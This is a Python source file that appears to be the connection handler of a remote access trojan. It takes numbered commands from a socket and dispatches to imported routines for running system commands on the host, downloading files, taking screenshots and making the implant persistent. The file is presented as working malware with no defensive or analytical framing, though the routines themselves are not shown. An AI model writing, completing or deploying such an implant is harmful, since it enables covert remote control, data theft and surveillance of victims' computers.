from core.command import executeCommand
from core.download import downloadFile
from core.screenshot import captureScreenshot
from core.persistance import becomePersitant
import time

def handleConnection(my_socket):
    print("[+] Handling connection")

    while True:
        user_input = my_socket.receiveData()

        print("[+] User input: ", user_input)

        if user_input == "1":
            print("[+] Running system commands")
            # develop function to run commands
            executeCommand(my_socket)
        elif user_input == "2":
            print("[+] Downloading file")
            downloadFile(my_socket)
        elif user_input == "3":
            downloadFile(my_socket)
        elif user_input == "4":
            my_socket.changeDirectory()
        elif user_input == "5":
            captureScreenshot(my_socket)
        elif user_input == "6":
            becomePersitant(my_socket)
        elif user_input == "99":
            break
        else:
            time.sleep(30)
            print("[!] Invalid user input ")
            